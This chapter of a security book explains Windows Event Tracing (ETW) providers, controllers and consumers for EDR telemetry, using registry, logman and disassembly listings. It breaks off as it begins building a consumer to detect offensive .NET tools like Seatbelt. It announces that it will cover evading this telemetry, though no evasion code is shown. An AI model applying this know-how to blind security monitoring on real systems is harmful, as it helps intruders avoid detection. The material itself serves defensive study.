<html><head></head><body>
<section epub:type="chapter" role="doc-chapter" aria-labelledby="ch8">&#13;
<header>&#13;
<h1 class="CHAPTER" id="ch8">&#13;
<span class="CN"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_143" aria-label=" Page 143. "/><samp class="SANS_Futura_Std_Bold_Condensed_B_11">8</samp></span>&#13;
<span class="CT"><samp class="SANS_Dogma_OT_Bold_B_11">EVENT TRACING FOR WINDOWS</samp></span>&#13;
</h1>&#13;
</header>&#13;
<figure class="opener"><img class="opener" src="../images/opener-img.png" alt=""/>&#13;
</figure>&#13;
<p class="CO">Using the Event Tracing for Windows (ETW) logging facility, developers can program their applications to emit events, consume events from other components, and control event-tracing sessions. This allows them to trace the execution of their code and monitor or debug potential issues. It may be helpful to think of ETW as an alternative to <i>printf</i>-based debugging; the messages are emitted over a common channel using a standard format rather than printed to the console.</p>&#13;
<p class="TX">In a security context, ETW provides valuable telemetry that wouldn’t otherwise be available to an endpoint agent. For example, the common language runtime, which is loaded into every .NET process, emits unique events using ETW that can provide more insight than any other mechanism into the nature of managed code executing on the host. This allows an EDR agent to collect novel data from which to create new alerts or enrich existing events.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_144" aria-label=" Page 144. "/>ETW is rarely praised for its simplicity and ease of use, thanks in no small part to the tremendously complicated technical documentation that Microsoft provides for it. Luckily, while ETW’s inner workings and implementation details are fascinating, you don’t need a full understanding of its architecture. This chapter covers the parts of ETW that are relevant to those interested in telemetry. We’ll walk through how an agent might collect telemetry from ETW and how to evade this collection.</p>&#13;
<section epub:type="division" aria-labelledby="sec1">&#13;
<h2 class="H1" id="sec1"><span id="h-108"/><samp class="SANS_Futura_Std_Bold_B_11">Architecture</samp></h2>&#13;
<p class="TNI">There are three main components involved in ETW: providers, consumers, and controllers. Each of these components serves a distinct purpose in an event-tracing session. The following overview describes how each component fits into the larger ETW architecture.</p>&#13;
<section epub:type="division" aria-labelledby="sec2">&#13;
<h3 class="H2" id="sec2"><span id="h-109"/><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Providers</samp></h3>&#13;
<p class="TNI">Simply put, providers are the software components that emit events. These might include parts of the system, such as the Task Scheduler, a third-party application, or even the kernel itself. Generally, the provider isn’t a separate application or image but rather the primary image associated with the component.</p>&#13;
<p class="TX">When this provider image follows some interesting or concerning code path, the developer can opt to have it emit an event related to its execution. For example, if the application handles user authentication, it might emit an event whenever authentication fails. These events contain any data the developer deems necessary to debug or monitor the application, ranging from a simple string to complex structures.</p>&#13;
<p class="TX">ETW providers have GUIDs that other software can use to identify them. In addition, providers have more user-friendly names, most often defined in their manifest, that allow humans to identify them more easily. There are around 1,100 providers registered in default Windows 10 installations. <a href="#tab8-1">Table 8-1</a> includes those that endpoint security products might find helpful.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_145" aria-label=" Page 145. "/></p>&#13;
<figure class="table">&#13;
<table class="table">&#13;
<caption>&#13;
<p class="TT" id="tab8-1"><samp class="SANS_Futura_Std_Heavy_B_11">Table 8-1:</samp> <samp class="SANS_Futura_Std_Book_11">Default ETW Providers Relevant to Security Monitoring</samp></p>&#13;
</caption>&#13;
<thead>&#13;
<tr class="table">&#13;
<th class="table TCH" scope="col">&#13;
<p class="TCH"><samp class="SANS_Futura_Std_Heavy_B_11">Provider name</samp></p>&#13;
</th>&#13;
<th class="table TCH" scope="col">&#13;
<p class="TCH"><samp class="SANS_Futura_Std_Heavy_B_11">GUID</samp></p>&#13;
</th>&#13;
<th class="table TCH" scope="col">&#13;
<p class="TCH"><samp class="SANS_Futura_Std_Heavy_B_11">Description</samp></p>&#13;
</th>&#13;
</tr>&#13;
</thead>&#13;
<tbody>&#13;
<tr class="table">&#13;
<td class="table TBF">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_11">Microsoft-Antimalware-Scan-Interface</samp></p>&#13;
</td>&#13;
<td class="table TBF">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_Oblique_I_11">{2A576B87-09A7-520E-C21A-4942F0271D67}</samp></p>&#13;
</td>&#13;
<td class="table TBF">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_11">Supplies details about the data passed through the Antimalware Scan Interface (AMSI)</samp></p>&#13;
</td>&#13;
</tr>&#13;
<tr class="table">&#13;
<td class="table TB">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_11">Microsoft-Windows-DotNETRuntime</samp></p>&#13;
</td>&#13;
<td class="table TB">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_Oblique_I_11">{E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}</samp></p>&#13;
</td>&#13;
<td class="table TB">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_11">Provides events related to .NET assemblies executing on the local host</samp></p>&#13;
</td>&#13;
</tr>&#13;
<tr class="table">&#13;
<td class="table TB">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_11">Microsoft-Windows-Audit-CVE</samp></p>&#13;
</td>&#13;
<td class="table TB">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_Oblique_I_11">{85A62A0D-7E17-485F-9D4F-749A287193A6}</samp></p>&#13;
</td>&#13;
<td class="table TB">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_11">Provides a mechanism for software to report attempts to exploit known vulnerabilities</samp></p>&#13;
</td>&#13;
</tr>&#13;
<tr class="table">&#13;
<td class="table TB">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_11">Microsoft-Windows-DNS-Client</samp></p>&#13;
</td>&#13;
<td class="table TB">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_Oblique_I_11">{1C95126E-7EEA-49A9-A3FE-A378B03DDB4D}</samp></p>&#13;
</td>&#13;
<td class="table TB">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_11">Details the results of domain name resolution on the host</samp></p>&#13;
</td>&#13;
</tr>&#13;
<tr class="table">&#13;
<td class="table TB">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_11">Microsoft-Windows-Kernel-Process</samp></p>&#13;
</td>&#13;
<td class="table TB">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_Oblique_I_11">{22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}</samp></p>&#13;
</td>&#13;
<td class="table TB">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_11">Provides information related to the creation and termination of processes (similar to what a driver</samp> <samp class="SANS_Futura_Std_Book_11">can obtain using a process-cre</samp><samp class="SANS_Futura_Std_Book_11">ation callback routine)</samp></p>&#13;
</td>&#13;
</tr>&#13;
<tr class="table">&#13;
<td class="table TB">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_11">Microsoft-Windows-PowerShell</samp></p>&#13;
</td>&#13;
<td class="table TB">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_Oblique_I_11">{A0C1853B-5C40-4B15-8766-3CF1C58F985A}</samp></p>&#13;
</td>&#13;
<td class="table TB">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_11">Provides PowerShell script block-logging functionality</samp></p>&#13;
</td>&#13;
</tr>&#13;
<tr class="table">&#13;
<td class="table TB">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_11">Microsoft-Windows-RPC</samp></p>&#13;
</td>&#13;
<td class="table TB">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_Oblique_I_11">{6AD52B32-D609-4BE9-AE07-CE8DAE937E39}</samp></p>&#13;
</td>&#13;
<td class="table TB">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_11">Contains information related to RPC operations on the local system</samp></p>&#13;
</td>&#13;
</tr>&#13;
<tr class="table">&#13;
<td class="table TB">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_11">Microsoft-Windows-Security-Kerberos</samp></p>&#13;
</td>&#13;
<td class="table TB">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_Oblique_I_11">{98E6CFCB-EE0A-41E0-A57B-622D4E1B30B1}</samp></p>&#13;
</td>&#13;
<td class="table TB">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_11">Provides information related to Kerberos authentication on the host</samp></p>&#13;
</td>&#13;
</tr>&#13;
<tr class="table">&#13;
<td class="table TB">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_11">Microsoft-Windows-Services</samp></p>&#13;
</td>&#13;
<td class="table TB">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_Oblique_I_11">{0063715B-EEDA-4007-9429-AD526F62696E}</samp></p>&#13;
</td>&#13;
<td class="table TB">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_11">Emits events related to the installation, operation, and removal of services</samp></p>&#13;
</td>&#13;
</tr>&#13;
<tr class="table">&#13;
<td class="table TB">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_11">Microsoft-Windows-SmartScreen</samp></p>&#13;
</td>&#13;
<td class="table TB">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_Oblique_I_11">{3CB2A168-FE34-4A4E-BDAD-DCF422F34473}</samp></p>&#13;
</td>&#13;
<td class="table TB">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_11">Provides events related to Microsoft Defender SmartScreen and its interaction with files downloaded from the internet</samp></p>&#13;
</td>&#13;
</tr>&#13;
<tr class="table">&#13;
<td class="table TB">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_11">Microsoft-Windows-TaskScheduler</samp></p>&#13;
</td>&#13;
<td class="table TB">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_Oblique_I_11">{DE7B24EA-73C8-4A09-985D-5BDADCFA9017}</samp></p>&#13;
</td>&#13;
<td class="table TB">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_11">Supplies information related to scheduled tasks</samp></p>&#13;
</td>&#13;
</tr>&#13;
<tr class="table">&#13;
<td class="table TB">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_11">Microsoft-Windows-WebIO</samp></p>&#13;
</td>&#13;
<td class="table TB">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_Oblique_I_11">{50B3E73C-9370-461D-BB9F-26F32D68887D}</samp></p>&#13;
</td>&#13;
<td class="table TB">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_11">Provides visibility into web requests being made by users of the system</samp></p>&#13;
</td>&#13;
</tr>&#13;
<tr class="table">&#13;
<td class="table TBL">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_11">Microsoft-Windows-WMI-Activity</samp></p>&#13;
</td>&#13;
<td class="table TBL">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_Oblique_I_11">{1418EF04-B0B4-4623-BF7E-D74AB47BBDAA}</samp></p>&#13;
</td>&#13;
<td class="table TBL">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_11">Supplies telemetry related to the operation of WMI, including event subscriptions</samp></p>&#13;
</td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
</figure>&#13;
<p class="TX">ETW providers are securable objects, meaning a security descriptor can be applied to them. A <i>security descriptor</i> provides a way for Windows to restrict access to the object through a discretionary access control list or log access attempts via a system access control list. <a href="#list8-1">Listing 8-1</a> shows the security descriptor applied to the Microsoft-Windows-Services provider.</p>&#13;
<pre id="list8-1"><code>PS &gt; <b>$SDs = Get-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\WMI\Security</b>&#13;
PS &gt; <b>$sddl = ([wmiclass]"Win32_SecurityDescriptorHelper").</b>&#13;
<b>&gt;&gt; BinarySDToSDDL($SDs.</b><b>'</b><b>0063715b-eeda-4007-9429-ad526f62696e</b><b>'</b><b>).</b>&#13;
<b>&gt;&gt; SDDL</b>&#13;
&#13;
PS &gt; <b>ConvertFrom-SddlString -Sddl $sddl</b>&#13;
Owner            : BUILTIN\Administrators&#13;
Group            : BUILTIN\Administrators&#13;
DiscretionaryAcl : {NT AUTHORITY\SYSTEM: AccessAllowed,&#13;
                   NT AUTHORITY\LOCAL SERVICE: AccessAllowed,&#13;
                   BUILTIN\Administrators: AccessAllowed}&#13;
SystemAcl        : {}&#13;
RawDescriptor    : System.Security.AccessControl.CommonSecurityDescriptor</code></pre>&#13;
<p class="CodeListingCaptionWide"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 8-1: Evaluating the security descriptor applied to a provider</span></p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_146" aria-label=" Page 146. "/>This command parses the binary security descriptor from the provider’s registry configuration using its GUID. It then uses the <samp class="SANS_TheSansMonoCd_W5Regular_11">Win32 _SecurityDescriptorHelper</samp> WMI class to convert the byte array in the registry to a security descriptor definition language string. This string is then passed to the PowerShell cmdlet <samp class="SANS_TheSansMonoCd_W5Regular_11">ConvertFrom-SddlString</samp> to return the human-readable details of the security descriptor. By default, this security descriptor only allows access to <i>NT AUTHORITY\SYSTEM</i>, <i>NT AUTHORITY\LOCAL SERVICE</i>, and members of the local Administrators group. This means that controller code must be running as admin to directly interact with providers.</p>&#13;
<section epub:type="division" aria-labelledby="sec3">&#13;
<h4 class="H3" id="sec3"><samp class="SANS_Futura_Std_Bold_Condensed_B_11">Emitting Events</samp></h4>&#13;
<p class="TNI">Currently, four main technologies allow developers to emit events from their provider applications:</p>&#13;
<p class="LH"><b>Managed Object Format (MOF)</b></p>&#13;
<p class="LIST1">MOF is the language used to define events so that consumers know how to ingest and process them. To register and write events using MOF, providers use the <samp class="SANS_TheSansMonoCd_W5Regular_11">sechost!RegisterTraceGuids()</samp> and <samp class="SANS_TheSansMonoCd_W5Regular_11">advapi!TraceEvent()</samp> functions, respectively.</p>&#13;
<p class="LH"><b>Windows Software Trace Preprocessor (WPP)</b></p>&#13;
<p class="LIST1">Like the Windows Event Log, WPP is a system that lets the provider log an event ID and event data, initially in binary but later formatted to be human readable. WPP supports more complex data types than MOF, including timestamps and GUIDs, and acts as a supplement to MOF-based providers. Like MOF-based providers, WPP providers use the <samp class="SANS_TheSansMonoCd_W5Regular_11">sechost!RegisterTraceGuids()</samp> and <samp class="SANS_TheSansMonoCd_W5Regular_11">advapi!TraceEvent()</samp> functions to register and write events. WPP providers can also use the <samp class="SANS_TheSansMonoCd_W5Regular_11">WPP_INIT_TRACING</samp> macro to register the provider GUID.</p>&#13;
<p class="LH"><b>Manifests</b></p>&#13;
<p class="LIST1">Manifests are XML files containing the elements that define the provider, including details about the format of events and the provider itself. These manifests are embedded in the provider binary at compilation time and registered with the system. Providers that use manifests rely on the <samp class="SANS_TheSansMonoCd_W5Regular_11">advapi!EventRegister()</samp> function to register events and <samp class="SANS_TheSansMonoCd_W5Regular_11">advapi!EventWrite()</samp> to write them. Today, this seems to be the most common way to register providers, especially those that ship with Windows.</p>&#13;
<p class="LH"><b>TraceLogging</b></p>&#13;
<p class="LIST1">Introduced in Windows 10, TraceLogging is the newest technology for providing events. Unlike the other technologies, TraceLogging allows for <i>self-describing</i> events, meaning that no class or manifest needs to be registered with the system for the consumer to know how to process them. The consumer uses the Trace Data Helper (TDH) APIs to <span role="doc-pagebreak" epub:type="pagebreak" id="pg_147" aria-label=" Page 147. "/>decode and work with events. These providers use <samp class="SANS_TheSansMonoCd_W5Regular_11">advapi!TraceLoggingRegister()</samp> and <samp class="SANS_TheSansMonoCd_W5Regular_11">advapi!TraceLoggingWrite()</samp> to register and write events.</p>&#13;
<p class="TX">Regardless of which method a developer chooses, the result is the same: events being emitted by their application for consumption by other applications.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec4">&#13;
<h4 class="H3" id="sec4"><samp class="SANS_Futura_Std_Bold_Condensed_B_11">Locating Event Sources</samp></h4>&#13;
<p class="TNI">To understand why a provider is emitting certain events, it’s often helpful to look at the provider itself. Unfortunately, Windows doesn’t provide an easy way to translate a provider’s name or GUID into an image on disk. You can sometimes collect this information from the event’s metadata, but in many cases, such as when the event source is a DLL or a driver, discovering it requires more effort. In these situations, try considering the following attributes of ETW providers:</p>&#13;
<ul class="BL">&#13;
<li class="BL">The provider’s PE file must reference its GUID, most commonly in the <i>.rdata</i> section, which holds read-only initialized data.</li>&#13;
<li class="BL">The provider must be an executable code file, typically a <i>.exe</i>, <i>.dll</i>, or <i>.sys</i>.</li>&#13;
<li class="BL">The provider must call a registration API (specifically, <samp class="SANS_TheSansMonoCd_W5Regular_11">advapi!EventRegister()</samp> or <samp class="SANS_TheSansMonoCd_W5Regular_11">ntdll!EtwEventRegister()</samp> for user-mode applications and <samp class="SANS_TheSansMonoCd_W5Regular_11">ntoskrnl!EtwRegister()</samp> for kernel-mode components).</li>&#13;
<li class="BL">If using a manifest registered with the system, the provider image will be in the <samp class="SANS_TheSansMonoCd_W5Regular_11">ResourceFileName</samp> value in the registry key <i>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Publishers\&lt;PROVIDER_GUID&gt;.</i> This file will contain a <i>WEVT_TEMPLATE</i> resource, which is the binary representation of the manifest.</li>&#13;
</ul>&#13;
<p class="TX">You could conduct a scan of files on the operating system and return those that satisfy these requirements. The <i>FindETWProviderImage</i> open source tool available on GitHub makes this process easy. <a href="#list8-2">Listing 8-2</a> uses it to locate images that reference the GUID of the Microsoft-Windows-TaskScheduler provider.</p>&#13;
<pre id="list8-2"><code>PS &gt; <b>.\FindETWProviderImage.exe "Microsoft-Windows-TaskScheduler" "C:\Windows\System32\"</b>&#13;
Translated Microsoft-Windows-TaskScheduler to {de7b24ea-73c8-4a09-985d-5bdadcfa9017}&#13;
Found provider in the registry: C:\WINDOWS\system32\schedsvc.dll&#13;
&#13;
Searching 5486 files for {de7b24ea-73c8-4a09-985d-5bdadcfa9017} …&#13;
&#13;
Target File: C:\Windows\System32\aitstatic.exe&#13;
Registration Function Imported: True&#13;
Found 1 reference:&#13;
 1) Offset: 0x2d8330 RVA: 0x2d8330 (.data)&#13;
&#13;
Target File: C:\Windows\System32\schedsvc.dll&#13;
Registration Function Imported: True&#13;
Found 2 references:&#13;
 1) Offset: 0x6cb78 RVA: 0x6d778 (.rdata)&#13;
 2) Offset: 0xab910 RVA: 0xaf110 (.pdata)<span role="doc-pagebreak" epub:type="pagebreak" id="pg_148" aria-label=" Page 148. "/>&#13;
&#13;
Target File: C:\Windows\System32\taskcomp.dll&#13;
Registration Function Imported: False&#13;
Found 1 reference:&#13;
 1) Offset: 0x39630 RVA: 0x3aa30 (.rdata)&#13;
&#13;
Target File: C:\Windows\System32\ubpm.dll&#13;
Registration Function Imported: True&#13;
Found 1 reference:&#13;
 1) Offset: 0x38288 RVA: 0x39a88 (.rdata)&#13;
&#13;
Total References: 5&#13;
Time Elapsed: 1.168 seconds</code></pre>&#13;
<p class="CodeListingCaptionWide"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 8-2: Using</span> <span class="eSANS_Futura_Std_Book_11a">FindETWProviderImage</span> <span class="eSANS_Futura_Std_Book_Oblique_I_11a">to locate provider binaries</span></p>&#13;
<p class="TX">If you consider the output, you’ll see that this approach has some gaps. For example, the tool returned the true provider of the events, <i>schedsvc.dll</i>, but also three other images. These false positives might occur because images consume events from the target provider and so contain the provider’s GUID, or because they produce their own events and so import one of the registration APIs. This method might also produce false negatives; for example, when the source of an event is <i>ntoskrnl.exe</i>, the image won’t be found in the registry or import either of the registration functions.</p>&#13;
<p class="TX">To confirm the identity of the provider, you must investigate an image further. You can do this using a relatively simple methodology. In a disassembler, navigate to the offset or relative virtual address reported by <i>FindETWProviderImage</i> and look for any references to the GUID coming from a function that calls a registration API. You should see the address of the GUID being passed to the registration function in the RCX register, as shown in <a href="#list8-3">Listing 8-3</a>.</p>&#13;
<pre id="list8-3"><code>schedsvc!JobsService::Initialize+0xcc:&#13;
00007ffe`74096f5c 488935950a0800  mov   qword ptr [schedsvc!g_pEventManager],rsi&#13;
00007ffe`74096f63 4c8bce          mov   r9,rsi&#13;
00007ffe`74096f66 4533c0          xor   r8d,r8d&#13;
00007ffe`74096f69 33d2            xor   edx,edx&#13;
00007ffe`74096f6b 488d0d06680400  lea   rcx,[schedsvc!TASKSCHED] <span class="CodeAnnotationCode-1" aria-label="annotation1">❶</span>&#13;
00007ffe`74096f72 48ff150f570400  call  qword ptr [schedsvc!_imp_EtwEventRegister <span class="CodeAnnotationCode-1" aria-label="annotation2">❷</span>&#13;
00007ffe`74096f79 0f1f440000      nop   dword ptr [rax+rax]&#13;
00007ffe`74096f7e 8bf8            mov   edi,eax&#13;
00007ffe`74096f80 48391e          cmp   qword ptr [rsi],rbx&#13;
00007ffe`74096f83 0f84293f0100    je    schedsvc!JobsService::Initialize+0x14022</code></pre>&#13;
<p class="CodeListingCaptionWide"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 8-3: Disassembly of the provider registration function inside</span> <span class="eSANS_Futura_Std_Book_11a">schedsvc.dll</span></p>&#13;
<p class="TX">In this disassembly, there are two instructions of interest to us. The first is the address of the provider GUID being loaded into RCX <span class="CodeAnnotation" aria-label="annotation1">❶</span>. This is immediately followed by a call to the imported <samp class="SANS_TheSansMonoCd_W5Regular_11">ntdll!EtwEventRegister()</samp> function <span class="CodeAnnotation" aria-label="annotation2">❷</span> to register the provider with the operating system.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec5">&#13;
<h4 class="H3" id="sec5"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_149" aria-label=" Page 149. "/><samp class="SANS_Futura_Std_Bold_Condensed_B_11">Figuring Out Why an Event Was Emitted</samp></h4>&#13;
<p class="TNI">At this point, you’ve identified the provider. From here, many detection engineers begin looking into what conditions triggered the provider to emit the event. The details of this process are outside the scope of this book, as they can differ substantially based on the provider, although we’ll cover the topic in greater depth in <span class="Xref"><a href="chapter12.xhtml">Chapter 12</a></span>. Typically, however, the workflow looks as follows.</p>&#13;
<p class="TX">In a disassembler, mark the <samp class="SANS_TheSansMonoCd_W5Regular_11">REGHANDLE</samp> returned from the event registration API, then look for references to this <samp class="SANS_TheSansMonoCd_W5Regular_11">REGHANDLE</samp> from a function that writes ETW events, such as <samp class="SANS_TheSansMonoCd_W5Regular_11">ntoskrnl!EtwWrite()</samp>. Step through the function, looking for the source of the <samp class="SANS_TheSansMonoCd_W5Regular_11">UserData</samp> parameter passed to it. Follow execution from this source to the event-writing function, checking for conditional branches that would prevent the event from being emitted. Repeat these steps for each unique reference to the global <samp class="SANS_TheSansMonoCd_W5Regular_11">REGHANDLE</samp>.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec6">&#13;
<h3 class="H2" id="sec6"><span id="h-110"/><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Controllers</samp></h3>&#13;
<p class="TNI">Controllers are the components that define and control <i>trace sessions</i>, which record events written by providers and flush them to the event consumers. The controller’s job includes starting and stopping sessions, enabling or disabling providers associated with a session, and managing the size of the event buffer pool, among other things. A single application might contain both controller and consumer code; alternatively, the controller can be a separate application entirely, as in the case of Xperf and logman, two utilities that facilitate collecting and processing ETW events.</p>&#13;
<p class="TX">Controllers create trace sessions using the <samp class="SANS_TheSansMonoCd_W5Regular_11">sechost!StartTrace()</samp> API and configure them using <samp class="SANS_TheSansMonoCd_W5Regular_11">sechost!ControlTrace()</samp> and <samp class="SANS_TheSansMonoCd_W5Regular_11">advapi!EnableTraceEx()</samp> or <samp class="SANS_TheSansMonoCd_W5Regular_11">sechost!EnableTraceEx2()</samp>. On Windows XP and later, controllers can start and manage a maximum of 64 simultaneous trace sessions. To view these trace sessions, use logman, as shown in <a href="#list8-4">Listing 8-4</a>.</p>&#13;
<pre id="list8-4"><code>PS &gt; <b>logman.exe query -ets</b>&#13;
&#13;
Data Collector Set                      Type         Status&#13;
-------------------------------------------------------------&#13;
AppModel                                Trace        Running&#13;
BioEnrollment                           Trace        Running&#13;
Diagtrack-Listener                      Trace        Running&#13;
FaceCredProv                            Trace        Running&#13;
FaceTel                                 Trace        Running&#13;
LwtNetLog                               Trace        Running&#13;
Microsoft-Windows-Rdp-Graphics-RdpIdd-Trace Trace    Running&#13;
NetCore                                 Trace        Running&#13;
NtfsLog                                 Trace        Running&#13;
RadioMgr                                Trace        Running&#13;
WiFiDriverIHVSession                    Trace        Running&#13;
WiFiSession                             Trace        Running<span role="doc-pagebreak" epub:type="pagebreak" id="pg_150" aria-label=" Page 150. "/>&#13;
UserNotPresentTraceSession              Trace        Running&#13;
NOCAT                                   Trace        Running&#13;
Admin_PS_Provider                       Trace        Running&#13;
WindowsUpdate_trace_log                 Trace        Running&#13;
MpWppTracing-20220120-151932-00000003-ffffffff Trace Running&#13;
SHS-01202022-151937-7-7f                Trace        Running&#13;
SgrmEtwSession                          Trace        Running</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 8-4: Enumerating trace sessions with</span> <span class="eSANS_Futura_Std_Book_11a">logman.exe</span></p>&#13;
<p class="TX">Each name under the Data Collector Set column represents a unique controller with its own subordinate trace sessions. The controllers shown in <a href="#list8-4">Listing 8-4</a> are built into Windows, as the operating system also makes heavy use of ETW for activity monitoring.</p>&#13;
<p class="TX">Controllers can also query existing traces to get information. <a href="#list8-5">Listing 8-5</a> shows this in action.</p>&#13;
<pre id="list8-5"><code>PS &gt; <b>logman.exe query 'EventLog-System' -ets</b>&#13;
&#13;
Name:                  EventLog-System&#13;
Status:                Running&#13;
Root Path:             %systemdrive%\PerfLogs\Admin&#13;
Segment:               Off&#13;
Schedules:             On&#13;
Segment Max Size:      100 MB&#13;
&#13;
Name:                  EventLog-System\EventLog-System&#13;
Type:                  Trace&#13;
Append:                Off&#13;
Circular:              Off&#13;
Overwrite:             Off&#13;
Buffer Size:           64&#13;
Buffers Lost:          0&#13;
Buffers Written:       155&#13;
Buffer Flush Timer:    1&#13;
Clock Type:            System&#13;
<span class="CodeAnnotationHang" aria-label="annotation1">❶</span> File Mode:             Real-time&#13;
&#13;
Provider:&#13;
<span class="CodeAnnotationHang" aria-label="annotation2">❷</span> Name:                  Microsoft-Windows-FunctionDiscoveryHost&#13;
Provider Guid:         {538CBBAD-4877-4EB2-B26E-7CAEE8F0F8CB}&#13;
Level:                 255&#13;
KeywordsAll:           0x0&#13;
<span class="CodeAnnotationHang" aria-label="annotation3">❸</span> KeywordsAny:           0x8000000000000000 (System)&#13;
Properties:            65&#13;
Filter Type:           0&#13;
&#13;
Provider:&#13;
Name:                  Microsoft-Windows-Subsys-SMSS&#13;
Provider Guid:         {43E63DA5-41D1-4FBF-ADED-1BBED98FDD1D}&#13;
Level:                 255&#13;
KeywordsAll:           0x0&#13;
KeywordsAny:           0x4000000000000000 (System)<span role="doc-pagebreak" epub:type="pagebreak" id="pg_151" aria-label=" Page 151. "/>&#13;
Properties:            65&#13;
Filter Type:           0&#13;
<var>--snip--</var></code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 8-5: Using</span> <span class="eSANS_Futura_Std_Book_11a">logman.exe</span> <span class="eSANS_Futura_Std_Book_Oblique_I_11a">to query a specific trace</span></p>&#13;
<p class="TX">This query provides us with information about the providers enabled in the session <span class="CodeAnnotation" aria-label="annotation2">❷</span> and the filtering keywords in use <span class="CodeAnnotation" aria-label="annotation3">❸</span>, whether it is a real-time or file-based trace <span class="CodeAnnotation" aria-label="annotation1">❶</span>, and performance figures. With this information, we can start to understand whether the trace is a form of performance monitoring or telemetry collection by an EDR.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec7">&#13;
<h3 class="H2" id="sec7"><span id="h-111"/><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Consumers</samp></h3>&#13;
<p class="TNI">Consumers are the software components that receive events after they’ve been recorded by a trace session. They can either read events from a logfile on disk or consume them in real time. Because nearly every EDR agent is a real-time consumer, we’ll focus exclusively on those.</p>&#13;
<p class="TX">Consumers use <samp class="SANS_TheSansMonoCd_W5Regular_11">sechost!OpenTrace()</samp> to connect to the real-time session and <samp class="SANS_TheSansMonoCd_W5Regular_11">sechost!ProcessTrace()</samp> to start consuming events from it. Each time the consumer receives a new event, an internally defined callback function parses the event data based on information supplied by the provider, such as the event manifest. The consumer can then choose to do whatever it likes with the information. In the case of endpoint security software, this may mean creating an alert, taking some preventive actions, or correlating the activity with telemetry collected by another sensor.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec8">&#13;
<h2 class="H1" id="sec8"><span id="h-112"/><samp class="SANS_Futura_Std_Bold_B_11">Creating a Consumer to Identify Malicious .NET Assemblies</samp></h2>&#13;
<p class="TNI">Let’s walk through the process of developing a consumer and working with events. In this section, we’ll identify the use of malicious in-memory .NET framework assemblies, such as those employed by Cobalt Strike’s Beacon <samp class="SANS_TheSansMonoCd_W5Regular_11">execute-assembly</samp> functionality. One strategy for identifying these assemblies is to look for class names belonging to known offensive C# projects. Although attackers can easily defeat this technique by changing the names of their malware’s classes and methods, it can be an effective way to identify the use of unmodified tools by less sophisticated actors.</p>&#13;
<p class="TX">Our consumer will ingest filtered events from the Microsoft-Windows-DotNETRuntime provider, specifically watching for classes associated with Seatbelt, a post-exploitation Windows reconnaissance tool.</p>&#13;
<section epub:type="division" aria-labelledby="sec9">&#13;
<h3 class="H2" id="sec9"><span id="h-113"/><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Creating a Trace Session</samp></h3>&#13;
